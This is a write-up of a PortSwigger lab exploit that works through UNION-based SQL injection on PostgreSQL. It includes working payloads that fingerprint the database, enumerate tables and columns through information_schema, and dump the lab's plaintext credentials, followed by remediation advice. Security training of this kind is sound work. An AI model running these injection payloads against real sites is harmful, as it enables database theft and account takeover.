# SQL injection attack, listing the database contents on non-Oracle databases

**Category:** SQL injection
**Level:** Practitioner
**Mechanism:** Schema enumeration via `information_schema` (randomised table/column names)

**Lab URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

---

## Vulnerability

Same injectable, reflected category filter as the earlier UNION labs — but the
credentials table and its columns have **randomised names** (`users_izzakz`,
`username_fccifc`, `password_xlksna`), so they can't be guessed. The database exposes
its own metadata catalog (`information_schema`), which the injection queries to
enumerate table and column names before extracting the data.

## Reconnaissance & Exploitation

**1. Fingerprint the DB.** Different engines need different syntax, so I identified the
database first (from the cheat sheet). A version payload that returned `200` confirmed
it:

```
category=Accessories' UNION SELECT version(),NULL--   → 200  → PostgreSQL 11.11
```

(`@@version` errored → not MSSQL/MySQL; `version()` worked → PostgreSQL. This picks the
right dialect — `information_schema` applies here, vs `all_tables` on Oracle.)

**2. Column count + types** (prior-lab technique): 2 columns, both text
(`' UNION SELECT 'a','a'--`).

**3. Enumerate tables** from the metadata catalog:

```
category=' UNION SELECT table_name,NULL FROM information_schema.tables--
```

The output listed every table; the credentials one had a random suffix: **`users_izzakz`**.

**4. Enumerate that table's columns:**

```
category=' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_izzakz'--
```

Revealed the real column names: **`username_fccifc`** and **`password_xlksna`**.

**5. Extract the credentials** using the discovered names:

```http
GET /filter?category='UNION SELECT username_fccifc, password_xlksna FROM users_izzakz-- HTTP/2
Host: 0a44000903e97c5980668bbd00fa0038.web-security-academy.net
```

```http
HTTP/2 200 OK
...
carlos          t0jcegf8hx7g4r63h6ge
administrator   dap4sa6w4oaxd6kybma3
wiener          ngk3jsdh2wiltljhkq4k
```

Logged in as `administrator` with the recovered password — lab solved.

## Impact

Full credential disclosure from a public filter, even though the schema was
"obfuscated" with random names. `information_schema` is a standard, queryable catalog in
every non-Oracle engine, so randomised names provide no protection — an attacker
enumerates the entire schema (tables, columns, types) and then dumps any table the DB
user can read. Same end result as a known-schema injection, one enumeration step later.

## Remediation

- Parameterised queries everywhere; bind the `category` value instead of concatenating.
- Least privilege: the web app's DB account should not be able to read
  `information_schema` broadly or unrelated tables like the credentials store.
- Salted password hashing (bcrypt/argon2) — passwords were plaintext here, turning a
  leak into instant takeover.
- Obfuscating object names is not a control; never rely on it.

## References

- **OWASP:** A03:2021 Injection
- **CWE:** CWE-89 (SQL Injection); CWE-256 (Plaintext Storage of a Password)

## Notes

- `information_schema` is the database's self-describing catalog:
  `information_schema.tables` lists tables, `information_schema.columns` lists columns
  (filter with `WHERE table_name='...'`). This is *the* schema-enumeration tool on
  MySQL/PostgreSQL/MSSQL. Oracle differs: `all_tables` / `all_tab_columns`.
- Fingerprint first (`version()` vs `@@version`): the DB engine dictates the syntax for
  everything after. A `200` on a version payload is a clean confirmation.
- Enumeration ladder: version → tables → columns of the target table → data. Random
  object names only add the two middle steps; they don't stop the attack.